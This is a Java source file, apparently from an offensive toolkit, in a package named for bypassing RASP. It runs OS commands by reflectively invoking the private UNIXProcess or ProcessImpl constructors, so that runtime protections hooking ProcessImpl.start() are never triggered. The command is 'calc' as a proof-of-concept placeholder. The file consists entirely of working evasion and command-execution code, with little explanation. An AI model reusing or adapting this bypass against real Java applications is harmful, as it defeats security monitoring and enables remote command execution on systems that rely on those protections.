package org.exploit.BypassRASP;

import sun.misc.JavaIOFileDescriptorAccess;
import sun.misc.SharedSecrets;

import java.lang.reflect.Constructor;

//适用于过滤ProcessImpl.start()，windows反射调用ProcessImpl构造函数，linux反射调用UNIXProcess构造函数
public class Bypass_start {
    private static final JavaIOFileDescriptorAccess fdAccess = SharedSecrets.getJavaIOFileDescriptorAccess();
    public static void main(String[] args) throws Exception {
        Class unixProcess = null;
        String[] cmd = new String[]{"calc"};
        //String[] cmd = new String[]{"/bin/bash","-c","mousepad"};
        //创建类
        try {
            unixProcess = Class.forName("java.lang.UNIXProcess");
            //    UNIXProcess(byte[] var1, byte[] var2, int var3, byte[] var4, int var5, byte[] var6, int[] var7, boolean var8)
            Constructor constructor = unixProcess.getDeclaredConstructor(byte[].class, byte[].class, int.class, byte[].class, int.class,byte[].class,int[].class,boolean.class);
            constructor.setAccessible(true);

            assert cmd != null && cmd.length > 0;

            byte[][] var5 = new byte[cmd.length - 1][];
            int var6 = var5.length;

            for(int var7 = 0; var7 < var5.length; ++var7) {
                var5[var7] = cmd[var7 + 1].getBytes();
                var6 += var5[var7].length;
            }
            byte[] var70 = new byte[var6];
            int var8 = 0;
            for(byte[] var12 : var5) {
                System.arraycopy(var12, 0, var70, var8, var12.length);
                var8 += var12.length + 1;
            }
            int[] var71 = new int[1];
            //var15 = new UNIXProcess(toCString(var0[0]), var70, var5.length, var72, var71[0], toCString(var2), var73, var4);
            constructor.newInstance(toCString(cmd[0]), var70, var5.length, null, var71[0], toCString(null), new int[]{-1,-1,-1}, false);
        } catch (ClassNotFoundException e) {
            Class processImpl = Class.forName("java.lang.ProcessImpl");
            Constructor constructor = processImpl.getDeclaredConstructor(String[].class, String.class, String.class, long[].class, boolean.class);
            constructor.setAccessible(true);
            constructor.newInstance(cmd,null,null,new long[]{1364,1368,1376},false);
        }
    }
    private static byte[] toCString(String var0) {
        if (var0 == null) {
            return null;
        } else {
            byte[] var1 = var0.getBytes();
            byte[] var2 = new byte[var1.length + 1];
            System.arraycopy(var1, 0, var2, 0, var1.length);
            var2[var2.length - 1] = 0;
            return var2;
        }
    }
}
